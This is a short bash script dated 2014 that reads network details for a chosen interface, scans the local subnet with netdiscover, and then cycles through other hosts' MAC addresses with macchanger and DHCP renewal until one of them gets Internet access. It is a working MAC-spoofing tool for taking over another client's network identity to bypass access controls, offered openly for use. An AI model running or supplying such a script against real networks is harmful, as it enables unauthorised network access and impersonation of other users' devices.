#!/bin/bash
##############################################

# Author: Fr3aknet
# Last modification: June 17, 2014

# Bug - If you not put an interface with the network configuration.
# Bug - Can not find a client on the network that has Internet.

##############################################

clear
echo "What interface do you work?"
read interface

clear

#IP
echo -n "This is your IP address:"
ip=`ifconfig |grep -n1 $interface|grep "inet addr"|cut -d' ' -f12|cut -d':' -f2`
echo $ip

#MAC
echo -n "This is your MAC address:"
ifconfig |grep -n1 $interface|grep "HWaddr"|cut -d' ' -f11

#MASCARA
mask=0
nextp=1
echo -n "This is your Subnet Mask:"
ifconfig |grep -n1 $interface|grep Mask|cut -d' ' -f16|cut -d ':' -f2

while [ $nextp -lt 4 ]
do
	numk=`ifconfig |grep -n1 $interface|grep Mask|cut -d' ' -f16|cut -d ':' -f2|cut -d "." -f$nextp`
	binari=`echo "obase=2;$numk" | bc`
	bits=`echo $binari|grep -o "1"|grep -c "1"`
	mask=`expr $mask + $bits`
	nextp=`expr $nextp + 1`
done
echo "CIDR notation is $mask"

#Hosts de la xarxa
rep=0
next=3
echo "Searching Hosts in the network"
netdiscover -i $interface -P -r $ip/$mask > hosts

#Suplentant identitats fins que tenim Internet
while [ $rep -eq 0 ]
do
	clear
	echo "Supplanting new identity"
###	nip=`cat hosts |tail -$next|head -1|cut -d' ' -f2`
	nmac=`cat hosts |tail -$next|head -1|cut -d' ' -f6`
	echo $nmac
	ifconfig $interface down
	macchanger -m $nmac $interface
	ifconfig $interface up
	dhclient -r $interface
	dhclient $interface
	sleep 1
	clear
	wget -q --delete-after google.com

	#Comprovem si tenim Internet
	if [ $? -ne 0 ];then
		next=`expr $next + 1`
		echo "No Internet with this identity"
	else
		rep=1
		echo "You already have Internet"
		rm hosts
	fi
done
